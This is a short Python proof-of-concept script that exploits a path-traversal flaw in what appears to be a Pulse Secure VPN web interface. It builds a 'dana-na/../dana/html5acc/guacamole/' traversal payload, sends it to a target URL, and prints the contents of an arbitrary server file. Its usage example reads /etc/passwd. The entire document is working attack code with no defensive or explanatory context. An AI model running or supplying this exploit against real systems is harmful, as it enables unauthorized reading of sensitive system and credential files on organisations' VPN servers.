import sys
import socket
import urlparse
import requests

try:
  url = sys.argv[1]
  file = sys.argv[2]
  payload = "dana-na/../dana/html5acc/guacamole/../../../../../.." + file + "?/dana/html5acc/guacamole/"	
except Exception,e:
  print "[ ] No input params?"
  print "[ ] Usage: python poc.py <URL> <FILE>"
  print "[ ]"
  print "[ ] Example: python poc.py https://vpn.example.com/ /etc/passwd"
  exit(0)

print "[*] Fetchin " + file + " from " + url
print "\t[*] URL: " + url + payload

try:
  url = url + payload
  headers = {"Connection": "close"}
  response = requests.get(url, headers=headers, verify=False)
except Exception,e:
  print "[*] Error (" + str(e) + ")"
  exit(0)
  
print "\t[*] Success!!"
print "\t[*] Response:"

# Remove this if you want full response.
print response.text[:100]


